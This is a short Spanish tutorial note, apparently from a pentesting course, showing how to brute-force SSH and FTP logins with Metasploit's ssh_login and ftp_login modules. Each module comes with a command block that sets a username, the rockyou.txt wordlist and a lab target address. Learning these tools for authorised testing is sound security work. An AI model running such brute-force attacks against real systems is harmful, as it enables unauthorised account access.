
Metasploit también tiene herramientas para hacer ataques de fuerza bruta que podemos utilizar para hacer los ataques a los protocolos ssh y ftp 
**Protocolo SSH**
```Metasploit
search ssh_login
use 0
show options
set USERNAME juan
set PASS_FILE /usr/share/wordlists/rockyou.txt
set RHOSTS 10.0.2.15
run
```
Primero buscaremos el modulo de ssh_login y seleccionaremos el de id 0![[Pasted image 20240301140627.png]]
Vemos las opciones que deberíamos rellenar y rellenamos las opciones de USERNAME y PASS_FILE para buscar la contraseña y PASSWORD y USER_FILE para buscar el usuario![[Pasted image 20240301140740.png]]
Al cabo de un rato encontrará la contraseña
![[Pasted image 20240301141826.png]]
**PROTOCOLO FTP**
```Metasploit
search ftp_login
use 0
show options
set USERNAME juan
set PASS_FILE /usr/share/wordlists/rockyou.txt
set RHOSTS 10.0.2.15
run
```
Primero buscaremos el modulo de ftp_login y seleccionaremos el de id 0![[Pasted image 20240301142350.png]]
Vemos las opciones que deberíamos rellenar y rellenamos las opciones de USERNAME y PASS_FILE para buscar la contraseña y PASSWORD y USER_FILE para buscar el usuario
![[Pasted image 20240301142424.png]]
